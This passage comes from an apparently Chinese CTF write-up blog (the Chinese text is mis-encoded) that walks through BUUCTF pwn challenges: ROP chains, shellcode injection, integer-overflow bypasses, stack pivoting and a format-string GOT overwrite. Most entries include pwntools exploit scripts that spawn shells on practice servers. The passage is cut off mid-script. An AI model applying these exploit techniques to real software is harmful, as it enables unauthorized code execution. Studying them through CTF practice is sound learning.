class="hljs-number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(system) <br>sh.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>å­¦åˆ°äº†ä¸€ä¸ªæ‰¾ flag çš„æ–°æ–¹æ³•ğŸ¥¹ï¼š</p><p>å¦‚æœ flag è¢«è—èµ·æ¥äº†ï¼Œå¯ä»¥ä½¿ç”¨ find -name â€œflagâ€ å‘½ä»¤æ¥æŸ¥æ‰¾ï¼Œç„¶åæ ¹æ®æŸ¥æ‰¾å‡ºçš„åœ°å€ç›´æ¥ cat &#x2F;file&#x2F;flag</p></blockquote><h3 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h3><p>main å‡½æ•°å°±æ˜¯ gets æ ˆæº¢å‡ºï¼Œget flag() åé—¨å‡½æ•°ç›´æ¥å°±å¯ä»¥è¾“å‡º flagã€‚ä½†éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><p>![](&#x2F;img&#x2F;å¤å¥&#x2F;picoctf_2018_rop chain_flag.png)</p><blockquote><p>a1 çš„å€¼ç‚¹å‡»åå³é”®é€‰æ‹© Hexadecimal</p></blockquote><p>win1å’Œ win2 éƒ½æ˜¯ç”±å¯¹åº”çš„å‡½æ•°è¿›è¡Œè®¾ç½®ï¼š</p><p>![](&#x2F;img&#x2F;å¤å¥&#x2F;picoctf_2018_rop chain_win1.png)</p><p>å…¶ä¸­ a1æ˜¯ç›´æ¥å‘ win_function2() ä¼ å‚ï¼Œæˆ‘ä»¬ä¹Ÿç›´æ¥åœ¨ payload é‡Œæ„é€ å°±å¥½ã€‚</p><p>![](&#x2F;img&#x2F;å¤å¥&#x2F;picoctf_2018_rop chain_win2.png)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26951</span>)<br>win1=<span class="hljs-number">0x080485CB</span><br><br>win2=<span class="hljs-number">0x080485D8</span><br>flag=<span class="hljs-number">0x0804862B</span><br><br>a11=<span class="hljs-number">0xBAAAAAAD</span><br>a12=<span class="hljs-number">0xDEADBAAD</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)+p32(win1)+p32(win2)+p32(flag)+p32(a11)+p32(a12)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p>éš¾å¾—çš„ï¼Œå¥½ä¹…ä¸è§çš„ NX ä¿æŠ¤æ²¡å¼€çš„é¢˜ç›®ï¼Œé‚£å°±æ˜¯å†™ shellcode å˜›ã€‚</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ez_pz_hackover_2016_check.png"></p><p>æ¼æ´å°±åœ¨ chall å‡½æ•°å’Œ vuln å‡½æ•°é‡Œï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ez_pz_hackover_2016_main.png"></p><blockquote><p>memchr() å‡½æ•°å°±æ˜¯å°† â€˜\nâ€™ ä¹‹åçš„æ•°æ®ç½®ä¸º0</p></blockquote><p><img src="/img/%E5%A4%8D%E5%81%A5/ez_pz_hackover_2016_vuln.png"></p><p>ç»¼åˆæ¥è€ƒè™‘å°±æ˜¯æˆ‘ä»¬éœ€è¦å…ˆç»•è¿‡ main å‡½æ•°ä¸­çš„ strcmp æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬éƒ¨ç½²çš„ <em>s</em> çš„ç»„æˆå°±æ˜¯ â€œ<code>crashme+&#39;\x00&#39;+å…¶ä»–</code>â€œ ã€‚</p><p>å†ç»“åˆåˆ° vuln å‡½æ•°ï¼Œæˆ‘ä»¬è¦†ç›–ä½ dest çš„ç¼“å†²åŒºï¼Œå¹¶åœ¨æ ˆä¸Šéƒ¨ç½² shellcode ï¼Œå°†è¿”å›åœ°å€ä¿®æ”¹ä¸º shellcode åœ°å€å³å¯ã€‚</p><p>å¼€å§‹çš„æ—¶å€™ç¨‹åºæ³„éœ²äº†æ ˆåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œçš„æ—¶å€™ s å¼€å§‹çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç»™å‡ºçš„æ ˆåœ°å€åšåŸºåœ°å€æ¥è®¡ç®—åˆ° shellcode çš„åç§»æ¥å¾—å‡ºshellcodeçš„åœ°å€ï¼Œè™½ç„¶åœ°å€ä¼šéšæœºåŒ–ä½†æ˜¯åç§»é‡ä¸ä¼šå˜ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åˆæ­¥ç¡®å®špayloadç»„æˆæ˜¯ <code>b&#39;crashme\x00&#39;+offest+p32(shellcode_add)+shellcode</code></p><p>æˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ shellcode çš„åç§»ï¼Œå°±æ˜¯çœ‹æˆ‘ä»¬çš„ EBP è·ç¦» s çš„åç§»å†åŠ 4ï¼ˆ leave,ret ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>gdb.attach(sh,<span class="hljs-string">&#x27;b *0x8048600&#x27;</span>)  <span class="hljs-comment">#åˆ©ç”¨gdbåŠ¨è°ƒï¼Œåœ¨0x8048600å¤„ä¸‹äº†ä¸ªæ–­ç‚¹</span><br><br>sh.recvuntil(<span class="hljs-string">&#x27;crash: &#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>payload=<span class="hljs-string">&#x27;crashme\x00&#x27;</span>+<span class="hljs-string">&#x27;aaaaaa&#x27;</span><br>sh.sendline(payload)<br><br>pause()<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A4%8D%E5%81%A5/ez_pz_hackover_2016_offest.png"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦å¡«å……çš„åŒºåŸŸå°±æ˜¯å°±æ˜¯ <code>0x38-0x22+4=0x1A</code> ã€‚</p><p>åŒç†ä¹Ÿå¯ä»¥è®¡ç®—å‡º shellcode çš„åœ°å€åç§»ï¼Œéœ€è¦æ³¨æ„ï¼Œ<code>vuln(src, n)</code> é‡Œ memcpy çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ &amp;src è€Œä¸æ˜¯ src ï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æŠŠ srcå¤„çš„ä¸œè¥¿æ‹·è´åˆ° destï¼Œè€Œæ˜¯ä» ebp+8 å¼€å§‹æ‹·è´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;crash: &#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(sh.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>shellcode=stack-<span class="hljs-number">0x1c</span><br>payload=<span class="hljs-string">&#x27;crashme\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x1a</span>-<span class="hljs-number">8</span>)+p32(shellcode_addr)+asm(shellcraft.sh())<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="æ•´æ•°æº¢å‡º"><a href="#æ•´æ•°æº¢å‡º" class="headerlink" title="æ•´æ•°æº¢å‡º"></a>æ•´æ•°æº¢å‡º</h1><h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>vuln å‡½æ•°ä¸­çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/pwn2_sctf_2016_main.png"></p><p>åœ¨æœ€å¼€å§‹æ¥æ”¶ç”¨æˆ·æƒ³è¦è¾“å…¥çš„å­—ç¬¦é•¿åº¦ï¼Œæœ‰ä¸€ä¸ª if æ£€æŸ¥ç¡®ä¿ç”¨æˆ·çš„è¾“å…¥å°äº 32ã€‚ä½†æ˜¯ç”¨æ¥æ¥å—è¾“å…¥çš„å‡½æ•° <code>get_n()</code> å¹¶ä¸æ˜¯ç³»ç»Ÿå‡½æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/pwn2_sctf_2016_getin.png"></p><p>å®ƒæ‰€æ¥æ”¶å’Œè¿”å›çš„éƒ½æ˜¯ unsigned int ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡ main å‡½æ•°ä¸­çš„æ£€æŸ¥ ã€‚</p><p>è€Œåçš„æ­¥éª¤å°±æ˜¯æ­£å¸¸çš„ ret2rop  æµç¨‹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>sh=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27438</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln=<span class="hljs-number">0x0804852F</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>printf_plt = elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br><br>sh.recvuntil(<span class="hljs-string">&#x27;read? &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;data!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span>)+p32(printf_plt)+p32(vuln)+p32(printf_got)<br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>printf_addr=u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)  <br>base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)    <br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;read? &#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;data!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span>) + p32(system) + p32(main_addr)+p32(bin_sh)<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p>å‡ºç°äº†ä¸€ç‚¹é—®é¢˜ï¼Œæœ¬åœ°èƒ½æ‰“é€šè¿œç¨‹æ‰“ä¸é€šï¼Œæœå‡ºæ¥çš„libcç‰ˆæœ¬éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘å››å¤„å†²æµªå‘ç°äº†ä¸€ä½å¸ˆå‚…çš„è¯„è®ºï¼š</p><p>![](&#x2F;img&#x2F;å¤å¥&#x2F;No libc satisfies constraints.png)</p><p>ä¸ç®¡äº†ï¼æœ¬åœ°é€šäº†å°±æ˜¯é€šäº†ğŸ¥¹</p><p><img src="/img/%E5%A4%8D%E5%81%A5/pwn2_sctf_2016_pwn.png"></p><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p>æ˜¯ä¸€ä¸ªæ•´æ•°æº¢å‡ºçš„é¢˜</p><p><img src="/img/%E5%A4%8D%E5%81%A5/bjdctf_2020_babystack2_main.png"></p><p>mainå‡½æ•°ä¸­çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œç¨‹åºä¸­å¦å¤–æœ‰ç°æˆçš„åé—¨å‡½æ•°ï¼Œå¦‚æœåœ¨è¯»å…¥ buf æ—¶æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€å°±å¯ä»¥ç›´æ¥ get shellã€‚</p><p>buf çš„é•¿åº¦ä¸º 0x10 ï¼Œä½†æ˜¯åœ¨è¾“å…¥å‰æœ‰ä¸€ä¸ª if æ¡ä»¶æ£€éªŒè¾“å…¥çš„æ•°å­—ä¸èƒ½å¤§äº 10ã€‚</p><p>scanf å¤„çš„ nbytes æ˜¯ unsigned intï¼Œunsigned int æ˜¯æ— ç¬¦å·æ•´å‹ï¼Œæˆ‘ä»¬å¦‚æœè¾“å…¥çš„æ˜¯ -1å°±ä¼šå˜æˆ unsigned int çš„æœ€å¤§å€¼ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ£€æµ‹å¹¶æä¾›è¶³å¤Ÿçš„ç©ºé—´ç”¨æ¥æº¢å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Please input the length of your name:\n&quot;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;What&#x27;s u name?\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x0400726</span>)<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h1><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p>ç¨‹åºè‡ªå¸¦ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸ªå‘ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_es_2_hack.png"></p><p>å®ƒè¿™ä¸ªåœ°æ–¹ echo flag æ˜¯çœŸçš„åªæ˜¯è¾“å‡ºäº† â€œflagâ€ã€‚ä½†è¿™ä¸æ˜¯ä»€ä¹ˆé—®é¢˜æˆ‘ä»¬ç»™ system å‡½æ•°ä¼ å…¥ä¸€ä¸ª â€œ&#x2F;bin&#x2F;shâ€ å°±è¡Œã€‚</p><blockquote><p>ä¸€å¼€å§‹çœ‹é”™äº†æˆ‘è¿˜æƒ³è¯´æ€ä¹ˆæ‰“ä¸é€šæ˜æ˜æ²¡é—®é¢˜ğŸ˜…</p></blockquote><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_es_2_flag.png"></p><p>main å‡½æ•°æ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œç›´æ¥è¿›å…¥ <code>vul</code></p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_es_2_vul.png"></p><p>s é•¿åº¦ä¸º 0x28 ï¼Œä½†æ˜¯ read åªèƒ½è¯»å…¥ 0x30 å­—èŠ‚ï¼Œæˆ‘ä»¬æƒ³è¦æº¢å‡ºçš„è¯ä¹Ÿåªèƒ½è¦†ç›– s ç¼“å†²åŒº+ebp+retï¼Œä¸èƒ½å®¹çº³æˆ‘ä»¬æ·»åŠ æ–°çš„è¿”å›åœ°å€ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘æ ˆè¿ç§»ã€‚</p><p>å¦‚æœæº¢å‡ºçš„ç©ºé—´è¶³å¤Ÿï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å¦‚ä¸‹çš„æ ˆç»“æ„æ¥get shell </p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_es_2_stack.png"></p><p>æ ˆè¿ç§»çš„è¯æ ˆç»“æ„çš„æ„é€ ä¹Ÿæ²¡ä»€ä¹ˆå˜åŒ–ï¼Œå°±æ˜¯ç»™å®ƒæŠŠè¿™ä¸€éƒ¨åˆ†è™šå‡çš„æ ˆç»“æ„ï¼ˆx æ”¾åˆ°åˆ«çš„åœ°æ–¹å»è€Œå·²ã€‚è¿™é“é¢˜çš„è¯æˆ‘ä»¬å°±ç›´æ¥æ§åˆ¶æ ˆåˆ° s çš„ç¼“å†²åŒºæ¥æ„é€  rop å³å¯ã€‚</p><p>è¿™æ ·ï¼Œé¢˜ç›®ä¸­ç»™çš„ä¸¤æ¬¡ read  å’Œ print éƒ½æ˜¯å¯ä»¥ä¾›æˆ‘ä»¬åˆ©ç”¨çš„ã€‚ç¬¬ä¸€æ¬¡ read æ³„éœ²æ ˆåœ°å€ç”¨æ¥æ ˆè¿ç§»ï¼Œç¬¬äºŒæ¬¡ç”¨æ¥æ‰§è¡Œæ ˆè¿ç§»ï¼Œæ§åˆ¶ ret è·³è½¬åˆ°æˆ‘ä»¬æ‰€è¿ç§»çš„æ ˆä¸Šã€‚</p><p>ç”±äº <code>printf(&quot;%s&quot;)</code> åœ¨ <code>&#39;\x00&#39;</code> å­˜åœ¨æˆªæ–­ï¼Œå› æ­¤åªéœ€è¦å¡«å…… padding åˆ° ebp ä½ç½®ï¼Œå°±å¯ä»¥ printf æ³„éœ² ebp çš„å€¼ã€‚</p><p>é€šè¿‡ GDB è°ƒè¯•å¯ä»¥è·å¾— ebp åœ¨æ ˆä¸Šçš„åç§»ä¸º 0x38 </p><p><img src="/img/%E5%A4%8D%E5%81%A5/3cciscn_2019_es_2_ebp.png"> </p><p>æ‰€ä»¥æˆ‘ä»¬åªè¦å°† <code>ebp-0x34</code> å³å¯è·å¾—æ ˆåœ°å€ã€‚</p><p>ç¬¬äºŒæ¬¡è¾“å…¥ s æ—¶å°±æ­£å¸¸æ„é€  rop é“¾å³å¯ï¼Œå¦é¡»æ³¨æ„æ¯æ¬¡ ret éƒ½ä¼šè®© esp+4ï¼Œéœ€è¦åœ¨ rop é“¾å‰åŠ å››å­—èŠ‚çš„ paddingã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>r=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28389</span>)<br><br>sys=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">&#x27;b&#x27;</span><br>r.send(payload)<br>r.recvuntil(<span class="hljs-string">&quot;b&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br>s=ebp-<span class="hljs-number">0x38</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(sys)+p32(<span class="hljs-number">1</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s)+p32(leave_ret)<br>r.send(payload2)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h1><h3 id="easyfmt"><a href="#easyfmt" class="headerlink" title="easyfmt"></a>easyfmt</h3><h5 id="åˆ†æé¢˜ç›®"><a href="#åˆ†æé¢˜ç›®" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h5><p>æŒ‰ç…§åšé¢˜ä¹ æƒ¯å…ˆçœ‹ä¸€ä¸‹æ–‡ä»¶ä¿æŠ¤ï¼Œåªå¼€å¯äº† canary å’Œ NX</p><p><img src="/img/%E5%A4%8D%E5%81%A5/easyfmt-checksec.png"></p><p>ç›´æ¥æ”¾è¿› ida åç¼–è¯‘</p><p><img src="/img/%E5%A4%8D%E5%81%A5/easyfmt-main.png"></p><p>è¿›å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹å‰æœ‰ä¸€ä¸ª if æ¡ä»¶æ£€æµ‹ CheckIn å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/easyfmt-checkin.png"></p><p>æœ€åä¸€è¡Œ <code>return</code> æ˜¯è®© <em>buf</em> å¼ºåˆ¶è½¬æ¢ä¸ºä¸€ä¸ª _BYTE ç±»å‹çš„æ•°æ®ä¹Ÿå°±æ˜¯åªæœ‰ä¸€ä½æ•°å­—ï¼Œå’Œ v2 æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚éšä¾¿å¡«ä¸€ä¸ªæ•°å­—ï¼Œå¤šè¯•å‡ æ¬¡è‚¯å®šèƒ½è¡ŒğŸ‘»</p><p>æˆåŠŸåè·³å‡º CheckIn æ¥çœ‹æ¼æ´åˆ©ç”¨éƒ¨åˆ†ï¼Œåªæœ‰ä¸€ä¸ª printfï¼Œä½†è‚¯å®šè¦æƒ³åŠæ³•å¤šæ¬¡åˆ©ç”¨å®ƒæ‰è¡Œã€‚å°±ç›´æ¥ç¬¬ä¸€æ¬¡åˆ©ç”¨ printf å…ˆæ”¹æ‰ exit çš„ got è¡¨ï¼Œè®©å®ƒè·³è½¬åˆ° if æ£€æµ‹åçš„åœ°å€ã€‚</p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p>é€šè¿‡ checkin æ£€æµ‹ä»¥åå…ˆä¿®æ”¹ exit çš„ got è¡¨ï¼Œç„¶åç¬¬äºŒæ¬¡æ¼æ´åˆ©ç”¨æ³„éœ² put çš„åœ°å€ï¼Œåˆ©ç”¨ ret2libc æŸ¥è¯¢ system åœ°å€ï¼Œç¬¬ä¸‰æ¬¡åˆ©ç”¨æ”¹æ‰put çš„ got è¡¨ï¼Œç¬¬å››æ¬¡å†™å…¥â€&#x2F;bin&#x2F;shâ€ï¼Œè®©ç¨‹åºè¿è¡Œç»“æŸè·³è½¬å›å»æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;);</code> ï¼Œå®Œæˆ getshellã€‚</p><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦æŸ¥æ‰¾ä¸€ä¸‹å¯¹åº”çš„åç§»å…ˆï¼Œ<del>å•Šå¿˜äº†æ€ä¹ˆæäº†</del></p><p><img src="/img/%E5%A4%8D%E5%81%A5/easyfmt-padding.png"></p><p>ï¼ˆæˆ‘å°±è¯´å¤šè¯•å‡ æ¬¡å°±é€šè¿‡æ£€æµ‹äº†å­ğŸ¤ª</p><p>åç§»æ˜¯8</p><p>æœ€åç»“æœæ˜¯</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs prolog">from pwn import *<br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>,os= <span class="hljs-string">&quot;linux&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>a = process(<span class="hljs-string">&#x27;./easyfmt&#x27;</span>)<br>elf = <span class="hljs-symbol">ELF</span>(<span class="hljs-string">&#x27;./easyfmt&#x27;</span>)<br>exit_plt = elf.plt[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>exit_got = elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>put_plt = elf.plt[<span class="hljs-string">&#x27;put&#x27;</span>]<br>put_got = elf.got[<span class="hljs-string">&#x27;put&#x27;</span>]<br>main_addr = <span class="hljs-number">0x400999</span><br><br>a.sendlineafter(<span class="hljs-string">&#x27;enter&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = fmtstr_payload(<span class="hljs-number">8</span>,&#123;exit_got:main_addr&#125;)<br><br>a.sendlineafter(<span class="hljs-string">&#x27;slogan: &#x27;</span>,payload)<br>payload = b<span class="hljs-string">&#x27;%10$sbbb&#x27;</span> + p64(puts_got)<br>a.sendafter(b<span class="hljs-string">&#x27;slogan: \x00&#x27;</span>,payload)<br>puts_addr = u64(a.recvuntil(b<span class="hljs-string">&#x27;bbb&#x27;</span>)[:-<span class="hljs-number">3</span>:].ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(hex(puts_addr))<br><br>libc=<span class="hljs-symbol">ELF</span>(<span 